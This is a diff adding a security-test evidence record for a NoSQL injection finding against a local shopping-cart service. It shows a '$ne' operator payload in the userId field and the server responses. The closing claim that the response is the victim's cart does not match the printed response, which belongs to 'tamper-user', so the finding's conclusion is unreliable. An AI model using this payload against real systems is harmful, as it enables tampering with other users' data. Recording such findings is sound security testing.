@@ -1,0 +1,13 @@
+================================================================
+EV-C3 : NoSQL injection - $ne operator in userId bypasses the filter and accesses/modifies another user's cart  [2026-09-21 15:31:01]
+Target: http://localhost:3105  (temporary scan instance, dedicated scan DB)
+================================================================
+
+---- REQUEST ----
+HTTP reproduction (curl): seed victim cart, then POST body: {"userId":{"$ne":null},...}
+---- RESPONSE ----
+--- 1. Seed a victim-200 cart (curl) ---
+{"userId":"victim-200","items":[{"productId":"top-secret","name":"Victim Secret Item","price":999,"quantity":3,"_id":"6ab1005fa8bc9acb135d9ec0"}],"_id":"6ab1005fa8bc9acb135d9ebf","createdAt":"2026-09-21T10:01:03.033Z","updatedAt":"2026-09-21T10:01:03.033Z","__v":0}
+--- 2. Attacker sends userId:{$ne:null}. EXPECT: rejection or attacker-only access. ---
+{"_id":"6ab1005ea8bc9acb135d9eb3","userId":"tamper-user","items":[{"productId":"t1","name":"Milkshake","price":1,"quantity":1,"_id":"6ab1005ea8bc9acb135d9eb4"},{"productId":"t2","name":"NEG","price":-500,"quantity":1,"_id":"6ab1005ea8bc9acb135d9eb8"},{"productId":"x","name":"injected","price":99,"quantity":1,"_id":"6ab1005fa8bc9acb135d9ec5"}],"createdAt":"2026-09-21T10:01:02.646Z","updatedAt":"2026-09-21T10:01:03.175Z","__v":2}
+--- 3. OBSERVED: response is the seeded victim-200 cart with attacker's "injected" item appended -> cross-user WRITE. $ne bypassed the userId filter (no auth needed). ---
